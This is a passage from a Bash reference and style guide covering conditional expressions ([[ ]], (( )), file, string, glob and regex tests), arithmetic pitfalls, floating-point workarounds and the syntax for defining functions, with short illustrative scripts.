: "${LOG_LEVEL:=info}"                         # default 'info' if unset (BCS0204)
: "${CACHE_DIR:=$HOME/.cache/myapp}"
: "${TIMEOUT:=30}"

printf 'LOG_LEVEL=%s\nCACHE_DIR=%s\nTIMEOUT=%s\n' \
  "$LOG_LEVEL" "$CACHE_DIR" "$TIMEOUT"

```

Run it bare:

```
LOG_LEVEL=info
CACHE_DIR=/home/user/.cache/myapp
TIMEOUT=30
```

Run it with `LOG_LEVEL=debug TIMEOUT=60 ./script` and only those two
get overridden — the assignment happens *only* when the variable is
unset or empty.

The single colon is essential: `${VAR:=default}` on its own line
without a leading command is not valid syntax (bash sees the
expansion as a command and tries to execute the value). `:` provides
the command slot and ignores the expanded text. Quoting the whole
right-hand side (as above) is BCS practice (BCS0301) — it preserves
spaces in defaults like `${MSG:=hello world}`.

**See also**: §5.4 parameter expansion (the `${VAR:=word}` form),
§13.4 checking return values (the `cmd || :` suppression idiom),
BCS0204 (constants and environment variables), BCS0301 (quoting
fundamentals), BCS0605 (error suppression).

# Part VIII — Conditional Expressions and Arithmetic

*Bash has two test contexts: `[[ ]]` for file/string/regex and `(( ))` for arithmetic. The legacy `[ ]` POSIX test exists but is not used in modern Bash. This Part documents both contexts, their operators, and their precedence rules.*

---

---

## 8.1 `[[ ]]` overview

The modern conditional command. `[[` is a *reserved word*, not a builtin: bash recognises it during grammar parsing, before any expansion runs over its operands. That single fact explains every quoting peculiarity in this section, and is the load-bearing distinction between `[[ ]]` and the legacy `[ ]` test command (§8.14).

Because parsing happens first, the shell knows the *structure* of the expression — left operand, operator, right operand — before it knows any of the *values*. That structural knowledge lets `[[ ]]` suspend two normally-mandatory expansion phases (word splitting and pathname expansion) on its operand text, and lets it apply operator-specific quoting rules to the right-hand side of `==`, `!=`, and `=~`. None of this is possible inside a command whose arguments are parsed only after expansion.

### Properties

- Syntax: `[[ expression ]]`. Returns 0 (true), 1 (false), or 2 on a syntax error.
- Operands undergo parameter, command, arithmetic, and process substitution; word splitting and pathname expansion are *suppressed* — variables are safe unquoted in any operand position (BCS0303).
- Logical operators inside the brackets: `&&`, `||`, `!`, parentheses for grouping. Unlike `[ ]`, these are *part of the conditional grammar*, not separate shell tokens — they need no escaping.
- Variable expansions on the *left* of an operator never need quoting. On the *right* of `==`, `!=`, or `=~`, quoting changes meaning.
- Right-hand side of `==`/`!=` is a glob pattern unless quoted (see §8.5).
- Right-hand side of `=~` is an ERE; quoting demotes the pattern to a literal string (see §8.6).

### The reserved-word consequence

```bash
# scenario: parse-time recognition lets bash treat [[ specially.
declare -- file='report file.txt'   # space in name would break [ -f $file ]
[[ -f $file ]] && echo 'exists'     # ⇒ exists (no quoting required)
[[ -f $UNSET ]] || echo 'absent'    # ⇒ absent (unset operand is empty string)
```

Inside `[[ ]]`, the unquoted `$file` cannot word-split into two arguments, because no word splitting is performed; and `$UNSET` does not need a default substitution, because `[[ -f '' ]]` is a well-defined false. The same operands inside `[ ]` would require defensive quoting and `${UNSET:-}` guards.

### The quoting-on-RHS rule

```bash
# scenario: same RHS, two meanings, controlled only by quoting.
declare -- f='report.txt'
[[ $f == *.txt ]]   && echo 'glob match'        # ⇒ glob match
[[ $f == "*.txt" ]] || echo 'literal differs'   # ⇒ literal differs
[[ $f == '*.txt' ]] || echo 'single-quoted too' # ⇒ single-quoted too
```

The asymmetry — left positions take values, right positions take *patterns* — is intentional: the right-hand side of a comparison is the only place where bash needs a glob/regex grammar at all, so that is the only place where quoting changes semantics.

**See also**: §8.5 (glob RHS), §8.6 (regex RHS), §8.8 (quoting rules), §8.14 (deprecated `[`/`test`), BCS0303, BCS0501.

## 8.2 File test operators

Single-operand tests on files. The full table:

- `-e file` — exists.
- `-f file` — regular file.
- `-d file` — directory.
- `-L file`, `-h file` — symbolic link.
- `-b file` — block device.
- `-c file` — character device.
- `-p file` — named pipe (FIFO).
- `-S file` — socket.
- `-r file` — readable by EUID.
- `-w file` — writable by EUID.
- `-x file` — executable by EUID.
- `-s file` — non-zero size.
- `-N file` — modified since last read.
- `-O file` — owned by EUID.
- `-G file` — group owned by EGID.
- `-k file` — sticky bit.
- `-u file` — SUID bit.
- `-g file` — SGID bit.
- `-t fd` — fd refers to a terminal.

## 8.3 File comparison operators

Two-operand file tests, available only inside `[[ ]]` (or the
deprecated `[`/`test`).

- `file1 -nt file2` — file1 newer than file2 (modification time).
- `file1 -ot file2` — file1 older than file2.
- `file1 -ef file2` — same inode (hard links, or two paths to the
  same file).

### Pitfall — missing operands

The newness/oldness operators have an asymmetric "missing file"
rule that catches almost everyone the first time:

- `f1 -nt f2` returns **true** when `f1` exists and `f2` does *not*.
- `f1 -ot f2` returns **true** when `f2` exists and `f1` does *not*.
- `f1 -ef f2` returns **false** if either file is missing.

This means a naive freshness test can pass simply because the
comparison file does not yet exist. Always pair the freshness test
with an existence check on both operands.

```bash
# scenario: rebuild target only if source is genuinely newer.
#!/usr/bin/env bash
set -euo pipefail

src='build.in'
target='build.out'

# wrong: this is true the first time when target/ does not exist —
# which happens to be what you want here, but is a coincidence.
if [[ $src -nt $target ]]; then
  echo 'rebuild needed'
fi

# right: explicit existence check makes intent clear (BCS0901).
if [[ ! -e $target ]] || [[ $src -nt $target ]]; then
  echo 'rebuild needed (target missing or stale)'
fi

# demonstration of the trap:
rm -f phantom.txt
[[ real.txt -nt phantom.txt ]] && echo 'newer'   # ⇒ newer (phantom does not exist!)
[[ phantom.txt -nt real.txt ]] && echo 'oh?'     # not printed (phantom missing → false)

```

The `-ef` operator is reliably symmetric: it tests inode equality
and so requires both files to exist (returning false otherwise),
making it safer for "are these the same file?" checks.

**See also**: §8.2 file test operators (`-e`, `-f`, etc.), §8.7
logical operators and grouping (combine `-e` with `-nt`), BCS0901
(safe file testing), BCS0303 (quoting in conditionals).

## 8.4 String operators

String comparison and inspection inside `[[ ]]`.

- `-z str` — empty (zero length).
- `-n str` — non-empty.
- `str1 = str2` — equal (POSIX form, accepted but not idiomatic).
- `str1 == str2` — equal (bash form; RHS is a glob unless quoted, §8.5).
- `str1 != str2` — not equal (RHS also a glob unless quoted).
- `str1 < str2` — lexicographically less (locale-dependent).
- `str1 > str2` — lexicographically greater.
- The `<` and `>` operators must be inside `[[ ]]`, where they are
  comparators; in ordinary commands they are redirections.
- `[[ -v var ]]` — true if `var` is set (declared and assigned).
- `[[ -v arr[i] ]]` — true if element `i` of `arr` is set.
- `[[ -R name ]]` — true if `name` is a nameref (§4.11).

### `-v` on an array element

`[[ -v arr[i] ]]` is the only reliable way to distinguish an
*unset* element from one that exists with an empty value. This
matters under `set -u`, where reading an unset element traps but a
set-but-empty element is fine. Note that `i` is taken as an
arithmetic context for indexed arrays (so a bare name is treated as
a variable) and as a literal key for associative arrays.

```bash
# scenario: indexed-array element existence vs emptiness under set -u
#!/usr/bin/env bash
set -euo pipefail

declare -a fruits=()
fruits[0]='apple'
fruits[2]=''                                   # set, but empty
# fruits[1] is unset — there is a *gap*

[[ -v fruits[0] ]] && echo "0 set: '${fruits[0]}'"   # ⇒ 0 set: 'apple'
[[ -v fruits[1] ]] && echo '1 set' || echo '1 unset' # ⇒ 1 unset
[[ -v fruits[2] ]] && echo "2 set: '${fruits[2]}'"   # ⇒ 2 set: '' (BCS0206)

# associative arrays: the index is a key string, NOT arithmetic
declare -A meta=([author]='gd' [date]='')
[[ -v meta[author] ]] && echo 'author key set'       # ⇒ author key set
[[ -v meta[missing] ]] || echo 'missing key absent'  # ⇒ missing key absent

```

The contrast with `${arr[i]:-}` is important: `${arr[1]:-default}`
under `set -u` would still trap before the `:-` could rescue it for
indexed-array gaps in some bash versions; `[[ -v arr[1] ]]` is the
robust idiom (BCS0206).

**See also**: §8.5 pattern matching (`==` glob behaviour), §8.6
regex matching with `=~`, §4.9 indexed arrays, §4.10 associative
arrays, §4.11 namerefs (interaction with `-R`), BCS0206 (arrays),
BCS0207 (parameter expansion).

## 8.5 Pattern matching with `==`

Inside `[[ ]]`, the right-hand side of `==` (or its synonym `=`) and `!=` is a *glob pattern* unless quoted. Quoting any portion of the RHS demotes that portion to a literal — partial quoting is legal and semantically meaningful: `[[ $f == prefix.* ]]` and `[[ $f == "prefix".* ]]` both match files whose name starts with `prefix.` and continues with anything; `[[ $f == "prefix.*" ]]` matches the eight-character string `prefix.*` only.

### Pattern syntax

The pattern grammar is identical to pathname expansion (§5.9):

- `*` — zero or more of any character
- `?` — exactly one of any character
- `[abc]` — one character from the set; `[a-z]` for ranges
- `[!abc]` or `[^abc]` — one character *not* in the set

`shopt -s nocasematch` makes pattern matching case-insensitive — useful for command-line argument parsing where users may type `Yes`, `YES`, or `yes`.

### Extended globs

Extended-glob patterns (§5.12) become available when `shopt -s extglob` is active:

- `?(p)` — zero or one occurrence of `p`
- `*(p)` — zero or more occurrences of `p`
- `+(p)` — one or more occurrences of `p`
- `@(p)` — exactly one occurrence of `p`
- `!(p)` — anything *except* `p`

The shopt is required at *parse time* of the surrounding script, not just at evaluation time. Set it once near the top of every script that uses extglob inside `[[ ]]`.

### Examples

```bash
# scenario: glob vs literal — quoting flips the meaning.
declare -- name='*.sh'
[[ $name == *.sh ]]   && echo 'glob: any .sh name'    # ⇒ glob: any .sh name
[[ $name == "*.sh" ]] && echo 'literal: that string'  # ⇒ literal: that string
```

The first test asks "does the value end in `.sh`?" — true for `script.sh`, `build.sh`, and the literal string `*.sh` itself. The second asks "is the value the literal `*.sh`?" — true only for that exact eight-character string.

```bash
# scenario: extglob alternation for cheap dispatch (replaces a 3-arm case).
shopt -s extglob
declare -- mode='maybe'
[[ $mode == @(yes|no|maybe) ]]  && echo 'recognised'  # ⇒ recognised
[[ $mode == !(yes|no|maybe) ]]  || echo 'in-set'      # ⇒ in-set
[[ $mode == ?(y|n)es ]]         || echo 'not yes/nes' # ⇒ not yes/nes
```

Without `shopt -s extglob`, `@(yes|no|maybe)` is parsed as a plain glob — the `@` matches a literal `@`, the parentheses become subshell tokens (or syntax errors, depending on context), and the test silently fails. Extglob is invisible in error output, so the missing shopt is one of the more frustrating bugs to diagnose.

For static-string comparison, prefer plain `==` with a quoted RHS or no metacharacters at all: `[[ $mode == 'production' ]]`. Reserve glob patterns for the cases where they earn their keep — file-extension dispatch, prefix/suffix tests, character-class validation.

**See also**: §5.9 (pathname expansion), §5.12 (extglob), §7.4 (`case`), §8.6 (regex alternative), BCS0303, BCS0502.

## 8.6 Regex matching with `=~`

The right-hand side of `=~` is an ERE (POSIX extended regular expression). The cardinal rule: **quoting the RHS changes semantics**. A quoted RHS matches its *literal* characters; regex metacharacters lose their meaning. This is the single most surprising behaviour of `[[ ]]` — and the one most likely to produce a test that *appears* to pass while validating nothing.

### Captures and `BASH_REMATCH`

Successful matches populate the indexed array `BASH_REMATCH`:

- `BASH_REMATCH[0]` — the entire match.
- `BASH_REMATCH[1]…[N]` — text captured by parenthesised groups, in order.

`BASH_REMATCH` is *volatile*: the next `=~` evaluation overwrites it, even an unrelated one in some other function. Copy the values you care about into named variables immediately, before any further conditional logic.

POSIX character classes (`[[:alpha:]]`, `[[:digit:]]`, `[[:space:]]`, `[[:xdigit:]]`, etc.) are supported and respect the current locale. For ASCII-only validation in scripts that may run under a UTF-8 locale, prefer explicit ranges (`[A-Za-z0-9]`) over `[[:alnum:]]`.

### The quoting trap

For a regex containing whitespace, alternation, or shell-special characters, store it in a variable and reference it unquoted. This is the only sane way to keep the pattern readable, and — more importantly — the only way to compose patterns from constants without falling into the quoting trap.

### Examples

```bash
# scenario: capturing version components from a tag.
declare -- tag='v2.17.4-rc1'
if [[ $tag =~ ^v([0-9]+)\.([0-9]+)\.([0-9]+) ]]; then
  declare -i major=${BASH_REMATCH[1]} minor=${BASH_REMATCH[2]} patch=${BASH_REMATCH[3]}
  printf 'major=%d minor=%d patch=%d\n' "$major" "$minor" "$patch"
fi
# ⇒ major=2 minor=17 patch=4
```

The `[0-9]+` quantifier is a regex feature; if the RHS were quoted, it would mean "the four-character string `[0-9]+`" and the match would fail.

```bash
# scenario: quoting the RHS breaks the regex — a common silent failure.
declare -- s='abc123'
[[ $s =~ ^[a-z]+[0-9]+$ ]]   && echo 'unquoted: matches'    # ⇒ unquoted: matches
[[ $s =~ "^[a-z]+[0-9]+$" ]] || echo 'quoted: literal only' # ⇒ quoted: literal only
```

The second test asks whether `abc123` contains the literal text `^[a-z]+[0-9]+$` as a substring. It does not. The bug here is that the test reads as a successful regex check to anyone skimming the code; only a failing edge-case input reveals it. Worse, the validation is *consistently negative* — it rejects every input — which often gets papered over with "well, the validation is strict".

```bash
# scenario: variable-stored pattern — the recommended idiom.
declare -- pat='^(error|warn|info):[[:space:]]*(.*)$'
declare -- line='warn: low disk'
if [[ $line =~ $pat ]]; then
  printf 'level=%s message=%s\n' "${BASH_REMATCH[1]}" "${BASH_REMATCH[2]}"
fi
# ⇒ level=warn message=low disk
```

The variable form has three virtues beyond readability: it sidesteps the quoting trap (the variable expansion is *not* quoted, so its content is treated as regex); it lets you keep complex patterns in named, testable constants; and it lets you build a regex by composition without the escaping hell that arises when the pattern itself contains quotes or whitespace.

A practical rule: if a regex contains anything beyond simple character classes and quantifiers, lift it into a `declare -r pat=…` constant near the top of the function. This gives reviewers one place to audit, and keeps the conditional itself readable.

**See also**: §8.5 (glob alternative), §22.x (input validation), BCS0303, BCS0501.

## 8.7 Logical operators and grouping

Inside `[[ ]]`, logical operators combine sub-expressions to form
compound conditions.

- `! expr` — negation.
- `expr1 && expr2` — short-circuit AND (skip `expr2` if `expr1`
  is false).
- `expr1 || expr2` — short-circuit OR (skip `expr2` if `expr1`
  is true).
- `( expr )` — grouping (parentheses must be inside `[[ ]]` to
  serve as grouping rather than as subshell delimiters).
- Precedence: `!` binds tightest, then `&&`, then `||`. Use
  parentheses when in any doubt.

These are *internal* operators of `[[ ]]`. Outside `[[ ]]`, the
same `&&`/`||` symbols sequence whole commands (§7.10) and have
*lower* precedence than most readers expect. The two contexts must
not be conflated.

### Combined-test example

Most BCS guard expressions need two or three checks chained with
short-circuit logic. The canonical case is "file exists, is
readable, and is non-empty before parsing":

```bash
# scenario: validate a config file in one expression.
#!/usr/bin/env bash
set -euo pipefail

config="$1"

if [[ -f $config && -r $config && -s $config ]]; then
  source "$config"                             # safe: exists, readable, non-empty (BCS0501)
else
  >&2 echo "config $config is missing, unreadable, or empty"
  exit 3
fi

# precedence demonstration: !, && and || combined.
# wrong: ambiguous to a human reader, even though bash parses it correctly.
if [[ ! -d $dir && -w $dir || $force == 1 ]]; then :; fi

# right: parenthesise so intent is unambiguous (BCS0303).
if [[ ( ! -d $dir && -w $dir ) || $force == 1 ]]; then :; fi

```

The parenthesised form survives later edits — adding a third clause
will not silently re-associate the existing two.

**See also**: §7.10 `&&` and `||` short-circuits (the *outside* of
`[[ ]]` form), §8.1 `[[ ]]` overview, §8.8 quoting rules inside
`[[ ]]`, BCS0303 (quoting in conditionals), BCS0501 (conditionals).

## 8.8 Quoting rules inside `[[ ]]`

`[[ ]]` is a reserved-word construct, parsed by bash *before*
ordinary word-splitting. Quoting rules are therefore relaxed
compared to ordinary commands — but they are not absent, and the
places where quoting *changes meaning* trip up even experienced
authors.

- Variable expansions: quoting is optional but harmless on the LHS
  of every operator. Inside `[[ ]]`, `[[ $f == foo ]]` is safe even
  if `$f` contains spaces, because no word-splitting occurs.
- Right of `==` / `!=`: **quoting matters** — unquoted RHS is a
  shell glob; quoted RHS is a literal string.
- Right of `=~`: **quoting matters** — unquoted RHS is an extended
  regular expression; quoted RHS is a literal string match (§8.6).
- Word splitting and pathname expansion do **not** occur inside
  `[[ ]]`.
- Operators must not be quoted: `[[ $a "<" $b ]]` compares against
  the *literal character* `<`, not lexicographically.

### Paired quoting matrix

The same value with three different quoting decisions illustrates
all three categories — harmless, required, and wrong:

```bash
# scenario: paired matrix — when quoting helps, when it must, when it breaks.
#!/usr/bin/env bash
set -euo pipefail

# CASE 1 — LHS quoting is harmless either way.
file='my report.txt'
[[ $file  == 'my report.txt' ]] && echo 'unquoted LHS: ok'   # ⇒ unquoted LHS: ok
[[ "$file" == 'my report.txt' ]] && echo 'quoted LHS: ok'    # ⇒ quoted LHS: ok (BCS0301)

# CASE 2 — RHS of ==: quoting is *required* to compare literally.
name='*.bash'
[[ install.bash == $name   ]] && echo 'unquoted RHS: glob match'    # ⇒ glob match (treats *.bash as glob)
[[ install.bash == "$name" ]] && echo 'quoted RHS: literal match'  || \
  echo 'quoted RHS: no literal match'                              # ⇒ no literal match (BCS0303)

# CASE 3 — operators must NOT be quoted.
a='abc' b='abd'
[[ $a < $b   ]] && echo 'unquoted <: lex less'        # ⇒ lex less
[[ $a "<" $b ]] && echo 'quoted "<": lex less'        # NOT printed: "<" is now a literal,
                                                       # there is no operator, syntax error suppressed

# CASE 4 — RHS of =~: same rule as ==. Quoting forces literal matching.
re='^[0-9]+$'
[[ 12345 =~ $re   ]] && echo 'unquoted =~: regex match'      # ⇒ regex match
[[ 12345 =~ "$re" ]] && echo 'quoted =~: literal match'  || \
  echo 'quoted =~: no literal match'                          # ⇒ no literal match

```

The rule of thumb: **quote the LHS for hygiene; decide RHS quoting
by the semantics you want.** If you want a literal compare, quote
the RHS; if you want a glob/regex match, leave it unquoted (and
store the pattern in a variable so the *pattern itself* is the
quoted string).

**See also**: §8.5 pattern matching with `==`/`!=`, §8.6 regex
matching with `=~`, §3.2 single quotes, §3.3 double quotes,
BCS0301 (quoting fundamentals), BCS0303 (quoting in conditionals),
BCS0307 (anti-patterns).

## 8.9 Arithmetic context `(( ))`

`(( expression ))` evaluates *expression* as integer arithmetic and returns 0 (true) when the result is non-zero, 1 (false) when zero. It is a *compound command*, not a substitution: it produces no stdout. Use `$(( ))` (§5.5) when you want the *value* as a string.

### Properties

- Variables are referenced without `$` inside `(( ))` — `count`, not `$count`. The `$` is harmless but redundant; omitting it makes the arithmetic intent obvious.
- Integer-only; bash has no native floating-point. For decimals, shell out to `bc -l` or `awk` (see §8.12).
- Idiomatic truthiness: `((count))` reads as "count is non-zero" and is preferred over `((count > 0))` per BCS0501.
- Side-effecting form: `((count += 1))` updates the variable and returns the new value's truthiness.

### Idiomatic use

```bash
# scenario: arithmetic as a condition — clean and idiomatic.
declare -i n=3
if ((n)); then echo 'non-zero'; fi   # ⇒ non-zero
((n > 0)) && echo 'positive'         # ⇒ positive
((result = 7 * n))                   # update; no $ needed
echo "$result"                       # ⇒ 21
```

Note the deliberate absence of `$` on the left of `=`: inside `(( ))`, `result = 7 * n` is an assignment expression, semantically identical to `result=$((7 * n))` but without the substitution-and-quoting overhead.

### The errexit pitfall

The interaction between `(( ))` and `set -e` is the most-cited bash gotcha for a reason: it is silent. `((count++))` evaluates to the *pre-increment* value of `count`. When `count` starts at 0, the expression returns 0, `(( ))` exits non-zero, and `set -e` kills the script — but the variable still gets incremented before the exit, so a post-mortem inspection shows `count=1` and the bug looks like it can't have happened.

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit extglob nullglob
declare -i count=0
((count++))                          # post-increment returns OLD value: 0 ⇒ false ⇒ exit
echo 'unreachable under set -e'      # ⇒ never prints; exit code 1
```

The same trap applies to `((--count))` whenever the result is zero, to `((flag = 0))` when used as a statement, and to any `(( ))` whose final value happens to be zero. The exemption matrix in §13.3 lists the (narrow) contexts where this exit doesn't fire — but relying on those exemptions is brittle.

The fix is unambiguous: use `+=`, which is a plain assignment with no return-value pitfall. BCS0505 makes this a hard rule.

```bash
# correct
declare -i count=0
count+=1                             # always safe; no truthiness games
count+=2                             # increments work the same way
((count))                            # use the value separately if you need it
```

For a counter you want to test *and* update in one step, write the test first: `((count > 0)) && count+=1` makes the intent explicit, and the `&&` short-circuit is unaffected by the value of `count` after the increment.

**See also**: §5.5 (`$(( ))` substitution), §13.3 (errexit exemption matrix), §8.13 (`let`), §8.10 (operators), BCS0501, BCS0505.

## 8.10 Arithmetic operators and precedence

Bash arithmetic supports a rich operator set with C-like precedence. Full table is in Appendix H; this is the structural overview.

- Unary: `++`, `--` (pre and post), `+`, `-`, `!`, `~`.
- Multiplicative: `*`, `/`, `%`.
- Additive: `+`, `-`.
- Shift: `<<`, `>>`.
- Comparison: `<`, `<=`, `>`, `>=`.
- Equality: `==`, `!=`.
- Bitwise: `&`, `^`, `|`.
- Logical: `&&`, `||`.
- Conditional: `cond ? then : else`.
- Assignment: `=`, `+=`, `-=`, `*=`, `/=`, `%=`, `<<=`, `>>=`, `&=`, `^=`, `|=`.
- Comma: `,` — evaluate left, return right.
- Exponentiation: `**`.

## 8.11 Integer types, overflow, base prefixes

Bash arithmetic uses the host C compiler's signed `intmax_t` —
typically 64-bit on modern Linux.

- Range: −2^63 to 2^63 − 1 on 64-bit Linux.
- Overflow wraps silently — no exception, no diagnostic, no errexit
  trip even under strict mode.
- Bases: decimal default; **leading `0`** for octal; `0x`/`0X` for
  hex; `BASE#NUM` for any base from 2 to 64.
- Base 64 uses `0-9 a-z A-Z @ _` for digit values 0–63.
- Examples: `0755` = 493, `0xff` = 255, `2#1010` = 10, `36#zz` = 1295.
- Octal-leading-zero gotcha: `0755` in arithmetic context is *octal*,
  yielding 493 — a frequent surprise when copying file modes into
  `(( ))` for arithmetic.

### Overflow demonstration

Silent wrap-around is the single failure mode that turns a working
script into one that returns mysterious negative numbers. Either
constrain the range, validate before computation, or use `bc -l` /
`awk` for arbitrary precision (§8.12).

```bash
# scenario: 64-bit integer overflow wraps to a large negative number.
#!/usr/bin/env bash
set -euo pipefail

declare -i max=9223372036854775807            # 2^63 - 1
echo "$max"                                    # ⇒ 9223372036854775807

# add 1: silent overflow, wraps to INT_MIN.
declare -i wrapped=$((max + 1))
echo "$wrapped"                                # ⇒ -9223372036854775808 (BCS0505)

# scenario: octal trap when reading a file mode.
mode=0755                                      # the user "knows" this is rwxr-xr-x
declare -i decimal=$((mode))
echo "$decimal"                                # ⇒ 493  (octal!) — surprise

# right: when you mean decimal, write decimal.
declare -i seven_five_five=755
echo "$seven_five_five"                        # ⇒ 755

# right: when you mean octal AND want bash to know, use 8#.
declare -i mode_octal=$((8#755))
echo "$mode_octal"                             # ⇒ 493 (explicit) (BCS0505)

```

The lesson: a leading zero in *any* arithmetic context (`(( ))`,
`$(( ))`, `let`, `declare -i x=...`) means base-8. If the value is
not actually intended as octal — for example a zero-padded request
ID like `0042` — it must be sanitised first (`${var#0}` or
`${var##+(0)}` after `shopt -s extglob`) before arithmetic touches
it.

**See also**: §8.10 arithmetic operators and precedence, §8.12
floating-point workarounds, §8.13 `let` builtin, §5.5 arithmetic
expansion, BCS0505 (arithmetic operations), BCS0201 (type-specific
declarations).

## 8.12 Floating-point — workarounds

Bash has no native floating-point type. The four common workarounds:

- **Scaled integers** — store amounts in cents instead of dollars,
  microseconds instead of seconds. The most reliable approach for
  fixed-precision domains (currency, time intervals).
- `bc -l` — `result=$(bc -l <<<"3.14 * 2")` for arbitrary precision.
- `awk` — `awk 'BEGIN { print 3.14 * 2 }'` for one-line arithmetic.
- `printf '%.2f\n' "$value"` — formatting only; bash still treats the
  value as a string.
- `python3 -c 'print(3.14 * 2)'` — when Python is available and a
  more complex expression is needed.

### Currency — the scaled-integer pattern

Currency is the canonical case where floating point introduces silent
rounding errors and integer cents introduce none. Store cents, do all
arithmetic in cents, and format only at the boundary.

```bash
# scenario: invoice totals in cents, formatted as dollars on output.
#!/usr/bin/env bash
set -euo pipefail

# Each line item: amount in CENTS (no decimals stored anywhere).
declare -ai items=(1995 4500 750 12999)        # $19.95, $45.00, $7.50, $129.99 (BCS0206)
declare -i  tax_bps=875                        # 8.75% as basis-points (1 bp = 0.01%)

declare -i subtotal=0
for cents in "${items[@]}"; do
  subtotal+=cents
done                                           # subtotal in cents (BCS0505)

# Tax: multiply first, then divide — keeps integer precision.
declare -i tax_cents=$(( subtotal * tax_bps / 10000 ))
declare -i total_cents=$(( subtotal + tax_cents ))

# Format only at the boundary.
fmt() { printf '$%d.%02d' $((${1} / 100)) $((${1} % 100)); }
printf 'subtotal: %s\n' "$(fmt "$subtotal")"     # ⇒ subtotal: $202.44
printf 'tax     : %s\n' "$(fmt "$tax_cents")"    # ⇒ tax     : $17.71
printf 'total   : %s\n' "$(fmt "$total_cents")"  # ⇒ total   : $220.15

```

The discipline: cents in, cents through, cents out — *until* the
final formatting step. Any intermediate float (`bc`, `awk`,
`python3`) reintroduces rounding error and breaks reconcileability
with downstream accounting systems that work in integer minor units
(BCS0506).

For one-shot arithmetic where precision is forgiving (display
purposes, ratios, percentages), `bc -l` and `awk` are fine; reserve
the scaled-integer pattern for anything that has to balance to the
penny.

**See also**: §8.10 arithmetic operators and precedence, §8.11
integer types and overflow, §5.5 arithmetic expansion, BCS0505
(arithmetic operations), BCS0506 (floating-point operations).

## 8.13 `let` builtin

`let` evaluates each of its arguments as an arithmetic expression
and returns failure (status 1) if the value of the **last**
expression is zero. Older idiom; modern code uses `(( ))` (§8.9)
for the same semantics with cleaner quoting.

- `let x=5 y=10 z=x+y` — multiple assignments in one call.
- `let "x = 5"` — quoting required when the expression contains spaces.
- Returns 1 if the last expression evaluates to zero, even when
  every assignment succeeded — same way `(( x=0 ))` returns 1.
- Use `(( ))` instead in modern code; `let` is older and fiddlier.

### The last-expression-zero exit-status trap

The trap that bites every script under `set -e` is that a *successful*
arithmetic operation whose final result is zero is *itself* a failure
return — and errexit then trips. This is identical to the `((var++))`
trap (§8.9) but is even more surprising in `let` form because the
syntax is "command-like" rather than expression-like.

```bash
# scenario: a perfectly valid let assignment kills the script under set -e.
#!/usr/bin/env bash
set -euo pipefail

# wrong: let returns 1 because the LAST expression evaluates to 0,
# even though the assignments all succeeded. set -e fires.
process_record() {
  local -i count=0
  let count=count+0                            # count is 0; let returns 1; script exits (BCS0601)
  echo "count is $count"                       # never reached
}

# right: use (( )) and add `|| :` if zero is a normal result.
process_record_safe() {
  local -i count=0
  (( count = count + 0 )) || :                 # explicit suppression (BCS0605)
  echo "count is $count"                       # ⇒ count is 0
}

process_record_safe

```

The rule: any arithmetic *expression* whose value can become zero
must be paired with an explicit success guard under errexit, or
re-cast as a plain assignment. The simplest guard is `|| :`. This is
a high-frequency strict-mode landmine alongside `((count++))` and
`read` at end-of-file.

**See also**: §8.9 arithmetic context, §8.10 arithmetic operators
and precedence, §13.3 errexit exemption matrix, §5.5 arithmetic
expansion, BCS0505 (arithmetic operations), BCS0601 (exit on error),
BCS0605 (error suppression).

## 8.14 The deprecated `[ ]` and `test`

POSIX `test` builtin and its `[ ]` synonym. Used by sh and by historical bash code; not used in modern Bash scripts.

- `[` is a builtin command requiring matching `]` as last argument.
- Field-splits its operands — must quote: `[ -f "$file" ]`.
- No regex, no `&&`/`||` (only `-a`, `-o` which are dangerous).
- No `=~`.
- Always use `[[ ]]` instead.
- Documented here only because the reader will encounter it in legacy code.

# Part IX — Functions

*Functions are bash's primary unit of code organisation. This Part documents definition syntax, argument passing, scope, return semantics, output discipline, and the inspection mechanisms.*

---

---

## 9.1 Definition syntax

Bash accepts two syntactic forms for defining a function. They produce
the same callable object once defined, but the surface differences
matter when reading other people's scripts and when the body needs
behaviour beyond a plain brace group.

### The two forms

The POSIX form is `name() { body; }` — parentheses, then a *compound
command* as the body. The bash keyword form is `function name { body; }`
or `function name() { body; }`. With the `function` keyword the
parentheses are optional; with the POSIX form they are mandatory.

```bash
# scenario: side-by-side definition forms — all three define the same callable
greet() { printf 'hello %s\n' "$1"; }                  # POSIX form
function greet { printf 'hello %s\n' "$1"; }           # keyword, no parens
function greet() { printf 'hello %s\n' "$1"; }         # keyword + parens (legal, redundant)
```

Style preference under BCS is the POSIX form (BCS0401): it is portable
to other Bourne-family shells *if* the body uses no bash-only features,
and it reads with less ceremony. Reserve the `function` keyword only
where it is technically required — most often when a function name
contains characters the parser would otherwise reject (hyphens are the
canonical example, though hyphenated names are themselves discouraged
by BCS0402).

### Body kind: brace group versus subshell

The body's outer compound command is normally a brace group `{ …; }`,
which executes in the *current* shell environment. Variable and trap
modifications survive the call. Bash also allows the body to be a
subshell `( …; )`, which forks a child process for every call. Inside
that subshell, `set -e`, traps, and variable mutations are isolated —
the parent never sees them.

```bash
# scenario: subshell-bodied function — every call forks; mutations are local
in_subshell() (
  cd /tmp || exit 1                  # cd persists only inside the subshell
  trap 'echo cleanup' EXIT           # fires when the subshell exits, not later
  ls -1 | head -3
)

in_subshell                          # output + cleanup, $PWD unchanged in parent
# → "$PWD" remains the parent's working directory
echo "PWD-was-not-/tmp: $([[ "$PWD" != /tmp ]] && echo yes || echo no)"
# ⇒ PWD-was-not-/tmp: yes
```

The subshell-bodied form is rare and deliberate: use it when the
function must contain side effects (cd, trap, IFS munging) that you
*want* to throw away on return. The cost is one fork per call; for
hot-path code the brace-group form is the only sensible choice.

### Trailing redirections on the definition

A function definition may be followed by a redirection, which is
applied to *every* invocation of that function — not to the act of
defining it. This is occasionally useful for log-only helpers, but
mostly a curio.

```bash
# scenario: trailing redirection captures stderr from every call
warn_log() { printf '[WARN] %s\n' "$@"; } 2>>/var/log/myapp.warn

warn_log "disk near full"            # ⇒ appended to /var/log/myapp.warn, no stderr to terminal
warn_log "another"                   # ⇒ same redirection re-applied
```

The redirection is evaluated at *call* time, not at definition time,
so the path may reference variables set later. BCS scripts rarely
exploit this; explicit redirection at the call site is clearer.

### Naming and the `function` keyword exception

A function name with the POSIX form must be a valid bash identifier
(alphanumeric plus underscore, not starting with a digit). The
`function` keyword loosens this rule and accepts hyphens — this is
the only routine reason to choose the keyword form. BCS0402 forbids
hyphens regardless: tooling such as `declare -f` and `export -f` then
work without quoting, and the name remains usable in any shell.

```bash
# legal under bash but rejected by BCS0402 — needs the keyword form
function send-email { :; }           # avoid

# canonical form
send_email() { :; }                  # accept
```

